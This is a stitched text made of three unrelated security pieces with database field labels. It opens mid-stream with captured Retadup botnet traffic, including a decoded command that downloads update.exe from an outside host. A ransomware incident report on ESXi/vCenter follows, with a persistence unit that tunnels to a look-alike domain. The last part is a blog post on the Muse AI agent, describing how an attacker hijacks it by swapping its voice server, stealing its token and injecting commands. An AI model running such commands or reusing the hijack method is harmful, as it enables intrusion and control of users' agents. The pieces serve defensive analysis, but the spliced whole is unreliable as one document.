GET /FD0C7EE872277F33E3335530299B836A/1/4/1/0/empty HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.4.0 (WinHTTP/5.1) like Gecko Host: noobminer.newblackage.com HTTP/1.1 200 OK Server: nginx Date: Thu, 06 Aug 2026 04:07:32 GMT Content-Type: text/html Content-Length: 68 Connection: keep-alive ::62327438664878386332786c5a5841744e6a41774d4441774c584e735a575677:: decoded command: "ok||||sleep-600000-sleep" HTTP/1.1 200 OK Server: nginx Date: Mon, 10 Aug 2026 04:18:43 GMT Content-Type: text/html Content-Length: 180 Connection: keep-alive ::623274386648783849475276643235736232466b4c576830644841364c79397964584a715a6e5a754c6e4a7a4c3356775a4746305a53356c654755364954703163475268644755755a58686c4c575276643235736232466b:: decoded command: "ok|||| download-http://rurjfvn.rs/update.exe:!:update.exe-download"

Geography

When the Retadup botnet was taken down in 2019, the reported figure was 850,000 disinfected systems. Our statistics for the first three quarters of this year show that the new campaign is much smaller in scale. Our solutions blocked Retadup worm infection attempts on around 15,000 systems, most of them in Peru, Angola, Russia, and Bolivia.

articles.title: Ransomware at the hypervisor layer: how attackers use ESXi and vCenter features for malicious purposes
articles.context: The ransom notes identified the attacker as the BlackNevas group, first observed in November 2024
articles.full_text:
Our Global Emergency Response Team (GERT) recently investigated an engagement in which an adversary destroyed an organization’s virtualization estate over a 10-day period. The campaign targeted four ESXi hosts, every virtual machine hosted on them, both vCenter Server Appliances, and all connected backup infrastructure. The ransom notes identified the attacker as the BlackNevas group, first observed in November 2024. What’s interesting about this attack is that no virtualization layer vulnerabilities were exploited: no guest-to-host escapes, no hypervisor memory corruption. Every action taken against ESXi was executed through legitimate VMware management interfaces. In September 2021, the Babuk ransomware source code was leaked online, including its ESXi version, which made ESXi ransomware accessible to cybercriminals with relatively low technical skills. At least ten subsequent ransomware families have leveraged this leaked code, including groups that otherwise lacked the expertise to develop ESXi-compatible ransomware lockers from scratch. We saw multiple operators using Babuk-derived ESXi lockers along with the leaked LockBit Windows builds. It is worth noting that while the Babuk ESXi version may target both old and up-to-date systems, the target organizations run unsupported ESXi versions, making them easier to attack.

This article examines why the hypervisor layer remains difficult to monitor, what common access paths adversaries use to reach it, and how they establish persistence on the management plane. We’ll also look into the architecture of ESXi encryptors, the deliberate destruction of backup infrastructure, and the log sources that enable post-incident reconstruction. At the end of this article, we’ll provide indicators of compromise recovered during the investigation.

Ten days of dwell time from initial access to the destructive phase. Timeline reconstructed from incident evidence

Why the hypervisor changes ransomware economics

Virtualization enables cost-effective and efficient resource management, simplifies simultaneous updates and policy enforcement. However, at the same time it reduces the number of control points and enables broader impact in case of a cyberattack. In non-virtualized environments, a single guest compromise normally affects one operating system. Compromise of the virtualization management plane gives the attacker access to many hypervisor hosts, while direct impact on an ESXi datastore can render many guest systems unavailable at once. This makes the hypervisor layer an attractive target for ransomware operators, especially when domain controllers, application servers, databases, and backup workloads share the same virtualized estate.

According to Kaspersky’s global cybersecurity services report, ransomware accounted for 39.4% of incidents GERT handled in 2025, and the data for the beginning of 2026 shows that it remains a major threat. Back in 2023, SentinelOne documented that multiple ransomware families are using ESXi lockers derived from the leaked Babuk source code, which lowered the development barrier for actors who otherwise lacked the necessary expertise to build ESXi-capable samples. This makes ransomware targeting virtualization environments more accessible to a broader range of threat actors, and this trend is still with us.

The visibility asymmetry

ESXi is a specialized hypervisor based on VMware’s proprietary VMkernel. It shares certain similarities with Linux (and other Unix-like systems), accepts Linux commands and runs certain Linux-like software, but it is different from general-purpose Linux distributions. Broadcom states that off-the-shelf security tools designed for general-purpose operating systems cannot run on ESXi without workarounds and that direct installation of third-party agents or antiviruses on ESXi and vCenter Server Appliance (VCSA) is not supported. Defenders therefore rely heavily on built-in hardening, management-plane telemetry, agentless security solution integrations, and telemetry collection from the infrastructure outside ESXi hosts.

Guest operating systems are usually protected by EDR software, but if an ESXi-side process modifies a virtual machine disk (VMDK) or related datastore file, an EDR agent inside a guest cannot directly observe or attribute the hypervisor process performing the operation. Guest telemetry may record consequences, such as I/O failures or an abrupt shutdown, but the malicious execution occurs outside its boundary. In the engagement examined here, this made host-native and management-plane telemetry central to the incident timeline reconstruction.

Active Directory integration

CVE-2024-37085 is a useful illustration of why it is crucial to authenticate to different systems separately even when the hypervisor itself is patched. The vulnerability affects ESXi hosts configured to use AD for user management. According to Microsoft, it is exploited by ransomware operators, including Akira and Black Basta, abusing the ESX Admins group behavior to obtain full ESXi administration. CISA lists the issue in their KEV catalog and notes that it has been used in ransomware incidents.

The vulnerability is fixed in ESXi 8.0 U3. For older systems, Broadcom recommends the following workaround:

Change the esxAdminsGroupAutoAdd value from true to false.

Change authValidateInterval from 1440 to 90 minutes.

Clear the default ESX Admins group mapping where appropriate.

These controls reduce exposure, but the architectural lesson is broader: domain compromise should not automatically allow the adversary to obtain hypervisor admin rights.

Recommendation for defenders

Avoid unnecessary direct Active Directory dependency on ESXi hosts. Where business requirements demand it, stick to the principle of least privilege: add only those accounts to administrative groups that really need this level of access, use separate admin accounts with separate credentials for the domain and for hypervisors, restrict access to the ESXi and vCenter management interfaces to only those network segments, accounts and workstations that are necessary to control it, and continuously validate ESXi permission changes. vCenter role-based access control (RBAC) and identity federation should be configured for virtualization administration, while ordinary enterprise credentials and broad domain groups should not be used to access vCenter or ESXi with high privileges.

Credential reuse from the Windows estate

The third path requires no vulnerability. Administrative credentials present on domain controllers, jump servers, backup systems, identity infrastructure or administrator workstations may provide access to vCenter or ESXi if the same admin accounts are used across different infrastructure segments. MITRE ATT&CK treats the Valid Accounts technique as applicable to ESXi and specifically notes that compromised default or domain accounts can provide privileged access to other systems.

In this incident , credentials obtained from non-virtualization systems inside the organization’s perimeter were used to reach the vCenter Server Appliances. Unlike vulnerability exploitation, successful authentication with a valid account may appear operationally normal. To reliably detect such activity, analysts must therefore evaluate the source host, account history, time, destination, subsequent administrative actions, and whether the authenticated account normally manages virtualization infrastructure.

Backup infrastructure as a credential bridge

Backup platforms are not passive storage. They commonly require service accounts, hypervisor credentials, repository access and broad network reach so they can protect and restore critical workloads. This makes the backup server a concentrated trust point. In this incident, the adversary extracted stored credentials after gaining administrative execution on backup infrastructure, creating a route toward other infrastructure tiers.

Persistence on the management plane

With the potential risk possibilities explained, let’s go back to our case study. The attackers managed to compromise via SSH the vCenter appliance managing virtualization disaster recovery where they established two layers of persistence. The first used MeshAgent, the endpoint component of the legitimate MeshCentral remote management platform. The second used Ligolo-ng as a reverse tunnel implemented as a systemd service. This activity maps to two ATT&CK techniques: Systemd Service (T1543.002) and Protocol Tunneling (T1572).

The timeline was as follows. The attackers authenticated on the appliance as root via SSH. Forty-three seconds later, they fetched and deployed MeshAgent through a shell script. The SSH session lasted 2 minutes and 26 seconds in total. After it ended, the adversary didn’t use SSH to access the compromised appliance anymore, thus reducing the usefulness of monitoring focused only on interactive SSH sessions. Roughly four hours later, they returned through MeshAgent and installed the Ligolo-ng tunnel as a persistent systemd unit.

Unit file /etc/systemd/system/vmware-vdma.service Service vmware-vdma Description "DNS, time, VM settings sync (v2.03.24766)" ExecStart /opt/vmware/bin/agent Restart always Strings in /opt/vmware/bin/agent: Ligolo-ng v0.8.2 api.cloudvflare[.]com:443

VCSA persistence artifact: /etc/systemd/system/vmware-vdma.service

The unit uses a VMware-like prefix, places its binary under /opt/vmware/bin/, describes plausible appliance housekeeping functions, and requests Restart=always. A defender should not treat any unrecognized VMware-looking service as malicious by default, because custom integrations may exist, but a service absent from the list of services the organization defines as trusted is a high-confidence anomaly requiring immediate validation.

Beyond the incident in question, more advanced ESXi persistence techniques have also been documented. For example, Mandiant observed attackers using malicious vSphere Installation Bundles (VIBs) as a persistence mechanism on compromised ESXi hosts. This demonstrates that attackers with administrative access can establish persistent access at the hypervisor layer, including persistence that survives host restarts. However, this incident shows that common remote-management software and a systemd service can be sufficient when vCenter itself is trusted and poorly monitored.

Why ESXi configuration change via vCenter is a trust-boundary failure

Host hardening is important, but centrally administered controls should not be considered independent once the central management tool is compromised. If vCenter has authority to modify host state, an attacker controlling it may be able to make a malicious change look structurally similar to legitimate compliance activity: read configuration, apply a desired state, and observe the result. The distinguishing context becomes authorization, the timing, the source account, the change window, and whether the desired state itself weakens security.

This is why vCenter should be treated as a Tier 0 asset and provided with the highest possible level of protection. Management-plane administrative accounts should be isolated from ordinary enterprise administration, network access should be restricted to dedicated management paths, high-risk configuration changes should require strong authentication and monitoring, and vCenter-to-ESXi traffic should be thoroughly compared to a normal behavior baseline (connection patterns, ports, protocols, source and destination systems) rather than implicitly trusted. All significant discrepancies should be treated as suspicious and investigated.

High-fidelity detection opportunity

An alert should be generated when Host Profile compliance (or remediation in VMware terms) changes TSM or TSM-SSH configuration outside an approved window, particularly when followed by a new SSH session from vCenter or another management appliance. This sequence is more precise than alerting on SSH alone because each step is legitimate in isolation but dangerous in combination.

Partial overwrite and what 2 KB actually implies

Incident artifacts indicated that approximately the first 2 KB of virtual disk files were overwritten. Damage to the beginning of a disk can destroy the protective MBR, primary GPT header, and other early boot or filesystem structures, which can immediately make a guest unbootable. However, the UEFI specification requires GPT media to keep both primary and backup GPT headers and partition-entry arrays in different locations. If the primary GPT is corrupt and the backup is valid, GPT-aware software should use the backup, which may help restore the primary. Therefore, an overwrite of the first 2 KB does not by itself mean that the partition metadata is unrecoverable. Practical recovery depends on whether additional boot records, filesystem metadata, volume structures, descriptors, or application data were also modified, and on the exact virtual-disk layout.

Destroying the recovery path first

In this incident, backup infrastructure was not collateral damage. The attacker disabled antivirus protection on the backup environment days before the main attack, and later stopped backup services, encrypted the recovery infrastructure, and disrupted administrative access — all before ESXi detonation. The order of operations reduced the defenders’ ability to restore production when they needed it most.

Recovery capabilities were disrupted before the final ESXi impact. The relative timings are based on the incident sequence

This changes the definition of a resilient backup architecture. Storage immutability is valuable, but it does not protect the identities, management servers, repositories, network paths, credentials, or procedures required to perform system restoration. Recovery should be designed as a separate security boundary with independent administrative identities, restricted management paths, offline or logically isolated recovery options, tested restore procedures, and monitoring that does not depend on the production control plane.

Two recent vulnerabilities in Veeam are a perfect illustration of this. Although neither of these vulnerabilities was seen exploited in this case, they take advantage of weak privilege management policy, which may make them exploitable by any domain user, including those with the lowest privileges. CVE-2024-40711 is listed in CISA’s KEV database as a vulnerability exploited by ransomware. CVE-2025-23120 is more recent and still absent from KEV, but it is worth noting that according to Veeam, it allows RCE, but only affects domain-joined backup servers. The general lesson is not vendor-specific: a recovery system that depends on the same identity plane as production infrastructure can be compromised and used to achieve the attackers’ goals.

Incident response at the virtualization layer

This section contains recommended actions when responding to an incident involving ESXi ransomware.

First 30 minutes after incident discovery

Isolate vCenter management access from ordinary enterprise segments while preserving investigator access through a controlled path.

Export vCenter Events and Tasks, SSO audit records, active sessions, and the current Host Profile definitions before remediation changes erase context.

Collect ESXi auth.log, shell.log, vpxa.log, vobd.log, hostd.log, vmkernel.log, vmkwarning.log, vmksummary.log, esxupdate.log, and hostprofiletrace.log from each affected host.

Preserve VCSA /etc/systemd/system, /opt/vmware paths referenced by previously unknown or unapproved units, shell history, wtmp, authentication logs, and copies or hashes of suspicious binaries.

Capture backup-server telemetry, service state, credential-store evidence, and network logs before rebuilding or rotating infrastructure credentials.

Record current execInstalledOnly state, host acceptance level, SSH/ESXi Shell state, Lockdown Mode, domain membership, and ESXi permission mappings.

Do not begin by rebooting ESXi merely to remove the attacker session. ESXi logging persistence depends on scratch and syslog configuration, and a reboot may destroy ramdisk-resident evidence. Confirm that critical logs have been copied or remotely retained before containing disruptive activity unless ongoing impact makes immediate shutdown unavoidable.

Containment priorities

Revoke or rotate compromised administrative credentials and remove attacker-controlled access paths, but preserve authentication and task records first.

Disable unapproved TSM-SSH and ESXi Shell access after collecting evidence; make sure that Host Profiles or other automation will not immediately re-enable them.

Remove unauthorized systemd services and remote-management agents from VCSA only after imaging or preserving the unit and referenced binaries.

Restore execInstalledOnly and acceptance-level settings to the approved baseline after determining that doing so will not disrupt evidence collection or critical recovery tooling.

Segment or disconnect compromised backup infrastructure from production and establish a clean recovery control plane before attempting large-scale restoration.

Architecture hardening derived from the case

Treat vCenter as Tier 0

VMware vCenter is not merely an inventory console. It can hold the authority to configure hosts, manage identities, power VMs, apply Host Profiles, and mediate access across the virtual estate. The incident in question shows why compromise of vCenter can undermine controls enforced through the virtualization management plane, providing an attacker with sufficient privileges to configure hosts, control VMs, and modify security-relevant settings across the virtual estate, potentially enabling the entire virtualized environment to be disrupted or destroyed within minutes. Protect vCenter with dedicated administrative identities, phishing-resistant MFA through supported identity federation, restricted management-network access, monitored privileged sessions, and close monitoring of Host Profile and cluster-level change operations.

Separate virtualization identities from ordinary enterprise administration

Avoid broad reuse of domain administrator or workstation admin credentials for virtualization. Where ESXi is domain-joined, apply the secure Active Directory configuration following Broadcom’s recommendations and continuously audit group mappings and permissions. Note that the Valid Accounts attacker technique is applicable to ESXi environments. Moreover, as an example of the Default Accounts subtechnique, MITRE specifically mentions the vpxuser account used by vCenter for host management.

Keep direct ESXi management paths narrow

SSH is useful for troubleshooting but should be treated as an exceptional administrative path rather than routine day-to-day access. Unauthorized SSH enablement on ESXi hosts both directly and through vCenter should be detected by monitoring TSM-SSH changes and treated as a suspicious event. To further harden ESXi hosts, use Lockdown Mode where operationally suitable, providing access only to a small set of explicitly authorized users, apply management-network filtering, and an approval and tracking policy for any changes, especially for enabling shell access.

Make the logging path independent of the affected host

Remote syslog from ESXi and vCenter should be stored on infrastructure outside the virtualization trust domain. Persistent scratch improves log survivability after reboot, but local evidence can still be lost if the data storage or host is destroyed. It is recommended to use centralized logging (e.g., SIEM logging), which should include authentication, shell, host management, Host Profile, and vCenter task telemetry. Proper logging should be configured before any incident happens, so the full picture is available to the response team in case of an emergency.

Design backup as a separate security boundary

Use independent administrative identities for backup, minimize domain dependencies, isolate repositories and management interfaces, protect immutable copies from production credentials, and test recovery under the assumption that vCenter and production AD are unavailable. A backup design should be judged not only by whether data is immutable, but by whether a clean operator can authenticate, reach the repository, validate the data, and restore workloads after the production control plane is compromised.

Resilience improves when enterprise identity, virtualization administration and recovery authority are separated rather than chained through shared privileged credentials

Conclusion

The central lesson from the incident in question is not that ESXi needs another endpoint agent. It is that virtualization security depends on the integrity of the management plane, the identity plane, and the recovery plane at the same time. A hypervisor can remain fully patched and protected and still become the point of maximum ransomware impact when the system authorized to manage it has already been compromised. The adversary did not need to break VMware’s cryptography or escape from a guest. Once they accessed a privileged vCenter control, a legitimate compliance mechanism could be used to change host state, enable SSH, and create a path into ESXi that looked structurally similar to normal administration activities.

The case also shows why destructive ransomware incidents are often won or lost before encryption begins. The attacker established alternate persistence, validated the ESXi payload hours before detonation, disrupted backup capability first, and then executed disruptive activities from the layer least visible to guest controls. The durable defense is therefore architectural. Treat vCenter as Tier 0. Separate virtualization identities from ordinary enterprise administration. Keep direct ESXi access narrow. articles.title: Capabilities and vulnerabilities of the Muse AI agent | Kaspersky official blog
articles.context: Around the same time, a researcher found a vulnerability that let an attacker take control of Muse and act on the owner’s behalf
articles.full_text:
That’s how the Odyssey might have opened if it were about Muse, Meta’s new AI agent. For now, the agent is available only as an iOS, Android, or macOS app and on the web. Even so, it’s already caught on: according to Meta’s official figures, Muse had been downloaded more than 10 million times by October 21.

The agent can do a lot: read your conversations and calendars, remind you about meetings and tasks, reply to messages and emails, track your spending, make purchases, search the web, generate content, and much, much more. In short, a full-blown concierge service for the chronically busy. Muse’s creators have admitted they drew heavily on the headline-grabbing AI agent OpenClaw, which researchers coincidentally found full of serious security holes.

But soon after launch, the bad news about Muse started piling up. First, a journalist discovered that the agent had gotten into his conversations without explicit permission. Around the same time, a researcher found a vulnerability that let an attacker take control of Muse and act on the owner’s behalf. And then it turned out that the calls the AI was supposedly making were actually being handed off to… human operators.

We look at how all this could happen, and how to use Muse as safely as possible.

When the agent reads more than it should

Journalist Jason Aten installed Muse on his iPhone and Mac, and deliberately didn’t give the agent access to the Messages app. Yet after he exchanged messages with a colleague about the new iPhones, Muse unexpectedly offered to draft a column on that very topic, citing his editor’s message about the deadline. Aten immediately asked the agent how it had acquired that information.

Muse’s explanation was that the Mac app had merely been passing it the text of notification pop-ups, which sounded quite plausible at first glance. But then Aten discovered that Muse had been syncing data directly from the local message database on his Mac. The sync had reached row 187 462 of the database. That number alone doesn’t reveal exactly how many messages were processed, but this was clearly far more than a few notifications.

According to a Meta employee, Muse could read conversations only if the user had separately allowed access to Messages and given the app Full Disk Access. How the agent managed to read the conversations without explicit permission remains unclear. The likely culprit was an opaque permissions interface.

Zero-day vulnerability in Muse

Just as the message-snooping scandal broke, researcher Patrick Wardle found a serious vulnerability in Muse tied to how the app stores and uses its internal settings.

Muse keeps several of these settings locally, and some of them could be changed with hardly any restrictions. One of these settings determines which server receives your voice input for speech recognition. Normally, these requests go to a Meta server, but Wardle found that almost any local app or Terminal command could change the address.

In practice, an attacker could do this in one of two ways: infect the victim’s device with malware, or talk the victim into pasting a specially crafted command into Terminal under the guise of “helpful instructions”. These dangerous instructions are often spread through fake websites or infected browser extensions that alter the content of the web pages people view.

Once the Meta server in the settings had been swapped for the attacker’s, Muse’s voice requests went there instead. Along with those requests, the attacker received an authorization token, which let them impersonate the account owner and control the agent remotely. If the user had already given Muse access to their camera, messages, files, and other data, the attacker could use all that for their own ends: take photos with the camera, write malicious files to disk, read conversations, locate linked devices, and much, much more.

Once in control of Muse, an attacker can use the same features as the agent itself: take pictures with the front camera, view photos, read files and modify or delete them, show notifications… All told, the researcher counted more than 50 such commands. Source

What’s more, the attacker could route Muse’s voice traffic through their server, and quietly slip their own instructions in with the victim’s voice commands. They would pick up the Muse token along the way, so after the first successful attack they could keep their access to the agent and go on controlling it remotely. Meta has already released an update that fixes the vulnerability, but stories like this are far from rare in the AI world.

Meatbags to the rescue

Muse has an experimental feature that calls U.S. businesses on the user’s behalf: the agent can phone a company itself, ask for the details it needs, and then show a transcript of the call. But as Reuters and 404 Media discovered, Meta had also been testing a curious add-on to this feature with its own employees: handing the calls off to trained call-center operators. Fully automated calls weren’t getting the job done: people on the other end simply hung up as soon as they heard a robotic voice. Meanwhile, many Meta employees had no idea their requests were being handed off to real people.

After a barrage of criticism, Meta shut down the human operator experiment. Company representatives said it had been a mistake to run the experiment without warning and promised to improve the feature.

Protecting your privacy: which Muse settings to check

Meta really does process a huge amount of data when people use Muse: conversations with the chatbot, photos, metadata, uploaded and generated files… This also includes information from any third-party apps you’ve connected to the agent. Meta employees can access this data on an as-needed basis.

We recommend checking the following settings and turning off any features you don’t need:

System permissions on Mac

Full Disk Access: full access to the disk and files on the computer.

Automation: lets the agent take actions in local apps, such as sending messages or deleting notes.

Notifications: lets the agent notify you when it finishes a task.

You can separately restrict access to apps that store their data on your Mac itself rather than in the cloud. Muse offers three modes for each app:

Off: the agent can neither read data nor take actions.

Read only: the agent can only read information, at your request.

Read and interact: the agent can read information and take actions in the app.

Action confirmation

By default, Muse is supposed to ask you for permission before taking important actions in third-party apps. Still, relying on an AI’s judgment for, say, shopping or conversations with coworkers is hardly a good idea, so it’s best to limit its autonomy ahead of time. In Muse, go to Settings → Permissions → Connectors, and choose either Ask for some actions (the less secure option), or Always ask. In Manage permissions, review any permissions you’ve already granted under Connectors.

Meta notes that if you use a single account, Muse connects to Facebook, Instagram, and Threads automatically, and that unlinking them cuts off access but doesn’t delete the data already collected; you have to delete it manually.

Website access

You can set up Muse’s internet access in much the same way:

Go to Settings→ Permissions → Web access defaults.

Choose Ask for some actions to have Muse ask for permission before sharing your data or opening an unfamiliar site, or Always ask to have the agent ask before visiting any site at all.

We recommend choosing Always ask and using anti-phishing protection: there’s always a chance the agent will mistakenly decide to open a fake or suspicious site.

Training on your data

Meta claims that the user data used to train Muse is anonymized and stored without being linked to an account. Unfortunately, that doesn’t mean you can’t be identified from context: the emails, messages, documents, and calendars the agent works with contain names, email addresses, home addresses, and other details that give away your identity.

Meta also says it removes certain categories of personal identifiers before training the model. But the more information goes into training, the higher the risk that one day it will surface by accident in someone else’s conversation, or become public because of a bug. Sadly, even internal safety filters sometimes fail.

And, naturally, training is on by default. To turn off training, go to Settings → Data controls → Help improve our AI models and select Turn off.

Permissions on mobile devices

On mobile devices, we recommend reviewing the permissions you’ve given the Muse app. In your phone’s settings, limit its access to your contacts, photos, location, microphone, and camera. Also turn off AI training on your data.

On iPhone, open Settings → Privacy & Security, and check which categories Muse can access. On Android, check Settings → Apps → Muse → Permissions. You can turn off training separately in Muse → Settings → Data controls.

How to use AI agents safely

Revoke permissions you don’t need, and don’t share sensitive data with the agent. The less information the agent can access, the less you risk if there’s a leak or a bug.

Don’t delegate important decisions or actions to agents. Even if the agent asks you to confirm before it buys something or sends a message, check exactly what it’s about to do, and where. Otherwise, you might end up paying for a purchase of non-existing goods or services on a fake website. Muse’s creators themselves write that the agent isn’t fully protected against prompt injections — hidden malicious commands aimed at AI.

Don’t run Terminal commands you don’t understand — especially if a website, email, or pop-up claims they’re needed for a “security check” or to “install an update”. That’s exactly how the ClickFix attacks work: they trick users into running a malicious command themselves. To protect yourself from malware and fake websites, install a comprehensive security solution on your devices.

Keep the app that runs the agent up to date. The developers have fixed the vulnerability Patrick Wardle found, but security problems in AI turn up all the time.

More reading on AI security and privacy:
